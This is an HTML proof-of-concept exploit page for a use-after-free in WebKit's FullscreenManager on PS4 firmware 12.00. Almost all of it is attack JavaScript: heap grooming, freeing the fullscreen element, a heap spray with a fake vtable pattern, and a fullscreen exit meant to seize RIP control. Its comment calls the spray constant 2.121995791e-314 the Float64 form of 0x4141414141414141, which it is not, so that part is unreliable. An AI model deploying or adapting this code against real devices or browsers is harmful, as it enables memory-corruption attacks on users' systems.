<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 12.00 WebKit UAF - RIP Control PoC</title>
<style>
    body { background-color: #111; color: #fff; font-family: sans-serif; text-align: center; padding-top: 50px; }
    button { padding: 20px; font-size: 18px; font-weight: bold; background-color: #cc0000; color: white; border: none; cursor: pointer; }
</style>
</head>
<body>

<h2>WebKit FullscreenManager UAF (Firmware 12.00)</h2>
<button onclick="triggerPoC()">Trigger UAF & Hijack VTable</button>
<p id="log">Aguardando...</p>

<script>
// Representação em Float64 do valor hexadecimal 0x4141414141414141
// O WebCore tentará dereferenciar isso como um ponteiro de VTable.
const POINTER_HIJACK_PATTERN = 2.121995791e-314; 

function triggerPoC() {
    document.getElementById("log").innerText = "Preparando a memória...\nPressione OPTIONS no controle do PS4.";

    let keepAlive = [];

    // [1] Heap Grooming: Preparamos buracos contíguos no bmalloc
    for(let i = 0; i < 5000; i++) {
        let arr = new Float64Array(8);
        arr[0] = i;
        keepAlive.push(arr);
    }

    // [2] Criação do Alvo: Elemento isolado para o Fullscreen
    let fsTarget = document.createElement("div");
    fsTarget.style.cssText = "position:absolute; top:0; left:0; width:100%; height:100%; background:black;";
    document.body.appendChild(fsTarget);

    // Entramos em Fullscreen. O FullscreenManager em C++ agora guarda um ponteiro para fsTarget.
    if (fsTarget.webkitRequestFullscreen) {
        fsTarget.webkitRequestFullscreen();
    }

    window.onblur = function() {
        document.getElementById("log").innerText = "Evento onblur disparado. Iniciando corrupção...";

        // [3] Força a Coleta de Lixo para limpar o Heap
        keepAlive = null;
        for (let i = 0; i < 20000; i++) {
            new ArrayBuffer(0x10000);
        }

        // [4] O Gatilho do UAF: Removemos o hospedeiro da tela cheia do DOM.
        // O DOM limpa suas referências, mas o FullscreenManager retém o "dangling pointer".
        fsTarget.remove(); 
        
        // [5] Heap Spray: Substituímos o objeto C++ deletado pelo nosso padrão de ponteiro.
        let spray = [];
        for(let i = 0; i < 10000; i++) {
            let p = new Float64Array(10);
            p.fill(POINTER_HIJACK_PATTERN);
            spray.push(p);
        }

        // [6] Execução da Falha: Ao tentar sair do modo Fullscreen, o motor WebCore
        // acessará o ponteiro retido, lerá o nosso 0x41414141 como VTable e tentará executar
        // o callback de saída. Resultado: Segfault (Controle de RIP/PC).
        setTimeout(() => {
            if (document.webkitIsFullScreen || document.fullscreenElement) {
                document.webkitExitFullscreen?.();
            }
        }, 1500);
    };
}
</script>

</body>
</html>
